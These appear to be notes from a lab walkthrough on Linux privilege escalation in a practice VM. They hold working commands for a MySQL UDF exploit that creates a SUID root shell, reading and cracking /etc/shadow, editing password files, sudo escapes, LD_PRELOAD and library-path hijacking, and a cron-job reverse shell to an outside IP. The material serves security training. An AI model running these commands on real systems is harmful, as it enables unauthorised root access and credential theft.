privesc methods:

task 2(mysql):
he MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

cd /home/user/tools/mysql-udf

Compile the raptor_udf2.c exploit code using the following commands:

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Connect to the MySQL service as the root user with a blank password:

mysql -u root

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!

rm /tmp/rootbash
exit

task 3 (etc/shadow):


The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

ls -l /etc/shadow

View the contents of the /etc/shadow file:

cat /etc/shadow

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Switch to the root user, using the cracked password:

su root

Remember to exit out of the root shell before continuing!




The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:

ls -l /etc/shadow

Generate a new password hash with a password of your choice:

mkpasswd -m sha-512 newpasswordhere

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

su root

Remember to exit out of the root shell before continuing!

task 5:

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

ls -l /etc/passwd

Generate a new password hash with a password of your choice:

openssl passwd newpasswordhere

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:
su root

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

su newroot

Remember to exit out of the root shell before continuing!

task 6

List the programs which sudo allows your user to run:

sudo -l

Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

Remember to exit out of the root shell before continuing!

task 7:

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):

sudo -l

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

sudo LD_PRELOAD=/tmp/preload.so program-name-here

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

ldd /usr/sbin/apache2

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

sudo LD_LIBRARY_PATH=/tmp apache2

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

Remember to exit out of the root shell before continuing!

task 8:

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

cat /etc/crontab

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

locate overwrite.sh

Note that the file is world-writable:

ls -l /usr/local/bin/overwrite.sh

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

nc -nvlp 4444

Remember to exit out of the root shell and remove the reverse shell code before continuing!
